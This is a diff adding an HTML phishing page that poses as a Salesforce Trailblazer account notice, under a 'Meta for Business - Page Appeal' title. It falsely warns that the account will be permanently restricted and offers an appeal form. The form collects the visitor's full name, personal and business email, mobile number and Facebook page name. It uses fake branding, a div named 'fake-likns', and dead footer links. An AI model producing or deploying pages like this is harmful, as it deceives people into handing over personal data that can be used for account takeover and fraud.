@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en" id="html">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta for Business - Page Appeal</title>
+    <link rel="stylesheet" href="../styles/bootstrap.min.css">
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="../styles/style.css">
+    <link rel="shortcut icon" href="../ico.ico" type="image/x-icon">
+
+</head>
+
+<body>
+   
+    <div class="container-sm" id="main">
+        <div class="container-head">
+           
+            <div class="burger-button" id="showPopup">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-8">
+                <div id="right">
+                    <!-- <h1>Delete your Trailblazer account.</h1>
+                    <p>Please read this page carefully. Your Trailblazer account affects many settings and properties that you may want to keep. It will not affect your corporate Salesforce product accounts.</p>
+                    <h2>Deleting your account removes all connected logins and data.</h2>
+                    <p>Your Trailblazer account is connected to the following accounts and logins. Deleting your Trailblazer account means removing all data across all connected logins.
+
+                        Note: if you are looking to simply remove a login from your account, you can disconnect a login in Settings without deleting your Trailblazer account.</p>
+                    <h3>Social logins</h3> -->
+
+                    <h1>Your Salesforce account will be permanently restricted.</h1>
+                    <p>A Trailblazer account is tied to activities across AppExchange, Events, IdeaExchange, Partner Community, Salesforce Help, Salesforce+, Trailblazer Community, and Trailhead. Deleting your Trailblazer account impacts all these experiences and is irreversible once your account is deleted.
+
+                        Here are some of the ways your account would be affected:</p>
+                    
+                    <br><br>
+                    <div class="fake-likns">
+                        <div class="action-button-list">
+                            <div class="action-button wide">
+                                <div class="action-button-img">
+                                    <img src="../img/trailhead-day.svg" alt="">
+                                </div>
+                                <div class="action-button-text">
+                                    <b>Trailhead</b>
+                                    <br>
+                                    <span class="small-grey">Deletion removes your rank, badges, points, and superbadges, and they can't be retrieved. Certifications will remain but will not be associated with your Trailblazer Account.</span>
+                                </div>
+                               
+                            </div>
+                            <div class="action-button wide">
+                                <div class="action-button-img">
+                                    <img src="../img/trailhead-day.svg" alt="">
+                                </div>
+                                <div class="action-button-text">
+                                    <b>Trailblazer Community</b>
+                                    <br>
+                                    <span class="small-grey">Posts you wrote remain visible after you delete your account, but they show as posted by an anonymous alias. If you want your posts removed, delete them before deleting your account. Connections you made and groups you follow will be deleted and can't be retrieved.</span>
+                                </div>
+                               
+                            </div>
+                            <div class="action-button wide">
+                                <div class="action-button-img">
+                                    <img src="../img/logo-salesforce.svg" alt="">
+                                </div>
+                                <div class="action-button-text">
+                                    <b>Salesforce Help</b>
+                                    <br>
+                                    <span class="small-grey">Deleting your Trailblazer account doesn't automatically delete associated support case data.</span>
+                                </div>
+                                
+                            </div>
+                        </div>
+
+                        <br>
+                        <div style="display: flex; justify-content: right;">
+                            <button style="background-color: #0176d3; border: 0px; padding: 10px 15px; border-radius: 5px; color: white;">Request for reconsideration</button>
+
+                        </div>
+
+                    </div>
+                    <br>
+                    
+
+                </div>
+
+            </div>
+
+
+            <div class="popup" id="popup">
+
+                <div class="popup-item">
+                    <div class="burger-button-popup" id="closePopup">
+                        <div class="bar"></div>
+                        <div class="bar"></div>
+                    </div>
+                    <div class="popup-content"></div>
+                </div>
+            </div>
+
+
+        </div>
+    </div>
+
+    <div class="modal form-modal" id="exampleModal1" tabindex="-1" aria-labelledby="exampleModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="exampleModalLabel">Appeal Form</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="first-form">
+
+                        <div class="mb-3">
+                            <label for="exampleFormControlTextarea1" class="form-label">
+                                Appeal
+                            </label>
+                            <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1"
+                                required></textarea>
+                            <div id="emailHelp" class="form-text">
+                                Please indicate why you believe that account restrictions were imposed by mistake.
+                            </div>
+                        </div>
+                        <div class="mb-3">
+                            <label for="FullNameField" class="form-label">Full Name</label>
+                            <input value="" name="full-name" type="text" class="form-control" id="FullNameField"
+                                minlength="3" required aria-describedby="emailHelp">
+                        </div>
+
+                        <div class="mb-3">
+                            <label for="PersonalEmailField" class="form-label">Personal Email</label>
+                            <input value="" name="personal-email" type="email" class="form-control"
+                                id="PersonalEmailField" required aria-describedby="emailHelp">
+                        </div>
+                        <div class="mb-3">
+                            <label for="BuisenessEmailField" class="form-label">Business Email</label>
+                            <input value="" name="buiseness-email" type="email" class="form-control"
+                                id="BuisenessEmailField" required aria-describedby="emailHelp">
+                        </div>
+
+                        <div class="mb-3">
+                            <label for="PhoneFirld" class="form-label">Mobile phone number</label>
+                            <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld"
+                                required aria-describedby="emailHelp" minlength="7" maxlength="18">
+                        </div>
+                        <div class="mb-3">
+                            <label for="fb-page-name-input" class="form-label">Facebook Page Name</label>
+                            <input value="" name="page-name" type="text" class="form-control" id="fb-page-name-input"
+                                required minlength="3" maxlength="80" aria-describedby="emailHelp">
+                        </div>
+                        <div class="mb-3 form-check">
+                            <input name="" type="checkbox" class="form-check-input" id="exampleCheck1" required>
+                            <label class="form-check-label" for="exampleCheck1">I agree with
+
+                                <a id="termsLink" class="add-svg">Terms of use
+                                </a>
+                            </label>
+                        </div>
+                        <div class="form-btn-wrapper">
+                            <button class="btn btn-primary">
+                                <div class="spinner-border text-light" role="status" style="display: none;">
+                                    <span class="visually-hidden">Loading...</span>
+                                </div>
+                                <span class="button-text">Send</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <img src="../img/meta-logo-grey.png" alt="">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div style="padding: 50px;">
+    <p class="small-grey">
+        <svg class="size--large" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+            <path fill="currentColor" d="M21.7,11.9c1.7-1.7,4-2.8,6.6-2.8c3.4,0,6.4,1.9,8,4.7c1.4-0.6,2.9-1,4.5-1C47,12.8,52,17.8,52,24
+                s-5,11.2-11.2,11.2c-0.8,0-1.5-0.1-2.2-0.2c-1.4,2.5-4.1,4.2-7.2,4.2c-1.3,0-2.5-0.3-3.6-0.8c-1.4,3.3-4.7,5.6-8.6,5.6
+                c-4,0-7.5-2.5-8.8-6.1c-0.6,0.1-1.2,0.2-1.8,0.2c-4.8,0-8.7-3.9-8.7-8.7c0-3.2,1.7-6,4.3-7.5c-0.5-1.2-0.8-2.6-0.8-4
+                c0-5.5,4.5-10,10.1-10C17,8,19.9,9.5,21.7,11.9"></path>
+            </svg>
+        © 2024, Salesforce, Inc. All rights reserved. Various trademarks held by their respective owners. Salesforce, Inc. Salesforce Tower, 415 Mission Street, 3rd Floor, San Francisco, CA 94105, United States
+    </p>
+    <ul class="footer-links" type-style="caption">
+        <li><a>Legal</a></li>
+        <li><a>Privacy Information</a></li>
+        <li><a>Responsible Disclosure</a></li>
+        <li><a>Terms of Use</a></li>
+        <li><a>Trust</a></li>
+        <li><a>Help</a></li>
+        <li><a>Contact</a></li>
+        <li><a>Cookie Preferences</a></li>
+        <li class="footer-link-image-wrapper">
+            <img class="footer-link-image" alt="Privacy Choices" src="assets/img/privacychoices.svg">
+            <a>Your Privacy Choices</a>
+        </li>
+    </ul>
+    
+    
+</div>
+
+
+   
+   
+</body>
+
+</html>
